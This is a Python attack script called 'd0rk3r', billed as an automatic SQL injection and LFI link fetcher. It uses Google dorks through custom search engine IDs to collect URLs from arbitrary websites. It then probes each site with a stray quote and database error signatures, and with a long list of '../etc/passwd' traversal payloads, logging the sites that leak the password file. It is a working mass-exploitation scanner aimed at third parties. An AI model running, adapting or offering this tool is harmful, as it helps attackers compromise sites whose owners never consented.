
# Example of use  : ./d0rk3r.py -i id= -s .lk -c redfront -f php -m 500import string, sys, time, urllib2, cookielib, re, random, threading, socket, os, time
import os
import string, sys, time, urllib2, cookielib, re, random, threading, socket, os, time
from random import choice
from optparse import OptionParser

from random import choice
from optparse import OptionParser

if sys.platform == 'linux' or sys.platform == 'linux2':
	clearing = 'clear'
else:
	clearing = 'cls'
os.system(clearing)


colMax = 20
log = "log.txt"
logfile = open(log, "a")
threads = []
numthreads = 1
lfinumthreads =8
timeout = 4
socket.setdefaulttimeout(timeout)

W  = "\033[0m";  
R  = "\033[31m"; 
G  = "\033[32m"; 
O  = "\033[33m"; 
B  = "\033[34m"; 


rSA = [2,3,4,5,6]

CXdic = {'blackle': '013269018370076798483:gg7jrrhpsy4',
         'ssearch': '008548304570556886379:0vtwavbfaqe',
         'redfront': '017478300291956931546:v0vo-1jh2y4',
         'bitcomet': '003763893858882295225:hz92q2xruzy',
         'dapirats': '002877699081652281083:klnfl5og4kg',
         'darkc0de': '009758108896363993364:wnzqtk1afdo',
         'googuuul': '014345598409501589908:mplknj4r1bu'}

SQLeD = {'MySQL': 'error in your SQL syntax',
         'MySQL_Valid_Argument': 'Supplied argument is not a valid MySQL result resource in',
         'MySQL_fetch':'mysql_fetch_assoc()',
         'MySQL_array': 'mysql_fetch_array()',
         'MySQL_result': 'mysql_free_result()',
         'MySQL_start': 'session_start()',
         'MYSQL': 'getimagesize()',
         'MySQL_call': 'Call to a member function',
         'Oracle1': 'Microsoft OLE DB Provider for Oracle',
         'Mysql_re': 'Warning: require()',
         'MysQl_11': 'array_merge()',
         'MySQLi': 'mysql_query()',
         'Oracle': 'ORA-01756',
         'MiscError': 'SQL Error',
	 'MiscError2': 'mysql_fetch_row',
	 'MiscError3': 'num_rows',
         'JDBC_CFM': 'Error Executing Database Query',
         'JDBC_CFM2': 'SQLServer JDBC Driver',
         'MSSQL_OLEdb': 'Microsoft OLE DB Provider for SQL Server',
         'MSSQL_Uqm': 'Unclosed quotation mark',
         'MS-Access_ODBC': 'ODBC Microsoft Access Driver',
         'MS-Access_JETdb': 'Microsoft JET Database'}
	 
lfis = ["/etc/passwd%00","../etc/passwd%00","../../etc/passwd%00","../../../etc/passwd%00","../../../../etc/passwd%00","../../../../../etc/passwd%00","../../../../../../etc/passwd%00","../../../../../../../etc/passwd%00","../../../../../../../../etc/passwd%00","../../../../../../../../../etc/passwd%00","../../../../../../../../../../etc/passwd%00","../../../../../../../../../../../etc/passwd%00","../../../../../../../../../../../../etc/passwd%00","../../../../../../../../../../../../../etc/passwd%00","/etc/passwd","../etc/passwd","../../etc/passwd","../../../etc/passwd","../../../../etc/passwd","../../../../../etc/passwd","../../../../../../etc/passwd","../../../../../../../etc/passwd","../../../../../../../../etc/passwd","../../../../../../../../../etc/passwd","../../../../../../../../../../etc/passwd","../../../../../../../../../../../etc/passwd","../../../../../../../../../../../../etc/passwd","../../../../../../../../../../../../../etc/passwd"]


filetypes = ['php','php5','asp','aspx','jsp','htm','html','cfm']

header = ['Mozilla/4.0 (compatible; MSIE 5.0; SunOS 5.10 sun4u; X11)',
          'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.2pre) Gecko/20100207 Ubuntu/9.04 (jaunty) Namoroka/3.6.2pre',
          'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Avant Browser;',
	  'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)',
	  'Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)',
	  'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.0.6)',
	  'Microsoft Internet Explorer/4.0b1 (Windows 95)',
	  'Opera/8.00 (Windows NT 5.1; U; en)',
	  'amaya/9.51 libwww/5.4.0',
	  'Mozilla/4.0 (compatible; MSIE 5.0; AOL 4.0; Windows 95; c_athome)',
	  'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)',
	  'Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.5 (like Gecko) (Kubuntu)',
	  'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; ZoomSpider.net bot; .NET CLR 1.1.4322)',
	  'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; QihooBot 1.0 qihoobot@qihoo.net)',
	  'Mozilla/4.0 (compatible; MSIE 5.0; Windows ME) Opera 5.11 [en]']

gnum = 100

def logo():
	
	print "\n\t\t#################################################"
        print "\t\t#                   AUTOMATIC                   #"
        print "\t\t#   SQL INJECTION & LFI LINKS FETCHER UTILITY   #"
        print "\t\t#                  BY WARLOCK                   #"
        print "\t\t#                                               #"
        print "\t\t#################################################"

def cxeSearch(go_inurl,go_site,go_cxe,go_ftype,maxc):
	uRLS = []
	counter = 0
       	while counter < int(maxc):
              	jar = cookielib.FileCookieJar("cookies")
                query = 'q='+go_inurl+'+'+go_site+'+'+go_ftype
                results_web = 'http://www.google.co.in/cse?'+go_cxe+'&'+query+'&num='+str(gnum)+'&hl=en&lr=&ie=UTF-8&start=' + repr(counter) + '&sa=N'
                request_web = urllib2.Request(results_web)
		agent = random.choice(header)
                request_web.add_header('User-Agent', agent)
		opener_web = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))
                text = opener_web.open(request_web).read()
		strreg = re.compile('(?<=href=")(.*?)(?=")')
                names = strreg.findall(text)
		counter += 100
                for name in names:
                      	if name not in uRLS:
                               	if re.search(r'\(', name) or re.search("<", name) or re.search("\A/", name) or re.search("\A(http://)\d", name):
                                       	pass
				elif re.search("google", name) or re.search("youtube", name) or re.search("%", name):
                                       	pass
				else:
                                      	uRLS.append(name)
	tmpList = []; finalList = []
	print "[+]TOTAL URLS FOUND WITH MATCH :", len(uRLS)
        for entry in uRLS:
		try:
			t2host = entry.split("/",3)
			domain = t2host[2]
			if domain not in tmpList and "=" in entry:
				finalList.append(entry)
				tmpList.append(domain)
		except:
			pass
	print "[+]TOTAL URLS(sorted) :", len(finalList)
	return finalList

class injThread(threading.Thread):
        def __init__(self,hosts):
                self.hosts=hosts;self.fcount = 0
                self.check = True
                threading.Thread.__init__(self)

        def run (self):
                urls = list(self.hosts)
                for url in urls:
                        try:
                                if self.check == True:
                                        ClassicINJ(url)
                                else:
                                        break
                        except(KeyboardInterrupt,ValueError):
                                pass
                self.fcount+=1

        def stop(self):
                self.check = False
		
class lfiThread(threading.Thread):
        def __init__(self,hosts):
                self.hosts=hosts;self.fcount = 0
                self.check = True
                threading.Thread.__init__(self)

        def run (self):
                urls = list(self.hosts)
                for url in urls:
                        try:
                                if self.check == True:
                                        ClassicLFI(url)
					
                                else:
                                        break
                        except(KeyboardInterrupt,ValueError):
                                pass
                self.fcount+=1

        def stop(self):
                self.check = False


def ClassicINJ(url):
        EXT = "'"
        host = url+EXT
        try:
                source = urllib2.urlopen(host).read()
                for type,eMSG in SQLeD.items():
                        if re.search(eMSG, source):
                                print R+"\n\n[+]FOUND :", O+host, "\n[+]ERROR TYPE IS :", type
				#logfile.write("\n"+host)
				
				
                        else:
                                pass
        except:
                pass
			
			



		
		
def ClassicLFI(url):
	lfiurl = url.rsplit('=' ,1)[0]
	if lfiurl[-1] != "=":
		lfiurl = lfiurl + "="
	for lfi in lfis:
		print G+"\n[+]CHECKING ",lfiurl+lfi.replace("\n", "")
		#print
		try:
			check = urllib2.urlopen(lfiurl+lfi.replace("\n", "")).read()
			if re.findall("root:x", check):
				print R+"\n\n[+]FOUND", O+lfiurl+lfi
				logfile.write("\n"+lfiurl+lfi)
				
				
		except:
				pass

parser = OptionParser()
parser.add_option("-i" ,type='string', dest='inurl',action='store', default="id=", help="inurl: operator")
parser.add_option("-s", type='string', dest='site',action='store', default="com", help="site: operator")
parser.add_option("-c", type='string', dest='cxe',action='store', default='redfront', help="custom search engine (blackle,ssearch,redfront,bitcomet,dapirats,darkc0de,googuuul)")
parser.add_option("-f", type='string', dest='filetype',action='store', default='php', help="server side language filetype")
parser.add_option("-m", type='string', dest='maxcount',action='store',default='25000', help="max results (default 500)")
(options, args) = parser.parse_args()

logo()
if options.inurl != None:
	print B+"\n[+]INURL :",options.inurl
	go_inurl = 'inurl:'+options.inurl
if options.inurl != None:
	if options.filetype in filetypes:
		print "[+]SOURCE TYPE :",options.filetype
		go_ftype = 'inurl:'+options.filetype
	else:
		print "[+]SOURCE TYPE : php"
		go_ftype = 'inurl:php'
if options.site != None:
	print "[+]DOMAIN TYPE :",options.site
	go_site = 'site:'+options.site
if options.cxe != None:
	if options.cxe in CXdic.keys():
		
		ccxe = CXdic[options.cxe]
	else:
		
		ccxe = CXdic['redfront']
	go_cxe = 'cx='+ccxe
print "[+]SEARCHING ON GOOGLE..."
cuRLS = cxeSearch(go_inurl,go_site,go_cxe,go_ftype,options.maxcount)
mnu = True
while mnu == True:
	print G+"\n\n\n[+]PRESS 1 SQL INJECTION URL OR WEBSITE FETCHER..."
	print "[+]PRESS 2 FOR LFI URL OR WEBSITE FETCHER..."
	print "[+]PRESS 0 FOR  EXIT...\n"
	chce = raw_input("\n[+]PLEASE ENTER YOUR CHICE :")
	if chce == '1':
		print "\n[+]LOADING PAYLOADS FOR SQL INJECTION TEST ... "
		print "[+]PLEASE WAIT..."
		print "[+]FETCHING LINKS...\n"
		i = len(cuRLS) / int(numthreads)
		m = len(cuRLS) % int(numthreads)
		z = 0
		if len(threads) <= numthreads:
			for x in range(0, int(numthreads)):
	        		sliced = cuRLS[x*i:(x+1)*i]
		                if (z < m):
		                	sliced.append(cuRLS[int(numthreads)*i+z])
		                        z += 1
				thread = injThread(sliced)
	        	        thread.start()
		                threads.append(thread)
		for thread in threads:	
			thread.join()
			
	if chce == '2':
		print "\n[+]LOADING DIRECTORIES FOR LFI TEST... "
		print "[+]PLEASE WAIT ..."
		print "[+]FETCHING LINKS...\n"
		i = len(cuRLS) / int(lfinumthreads)
		m = len(cuRLS) % int(lfinumthreads)
		z = 0
		if len(threads) <= lfinumthreads:
			for x in range(0, int(lfinumthreads)):
	        		sliced = cuRLS[x*i:(x+1)*i]
		                if (z < m):
		                	sliced.append(cuRLS[int(lfinumthreads)*i+z])
		                        z += 1
				thread = lfiThread(sliced)
	        	        thread.start()
		                threads.append(thread)
		for thread in threads:	
			thread.join()

	
	if chce == '0':
		print R+"\n[-]EXITING..."
		system.exit(5)
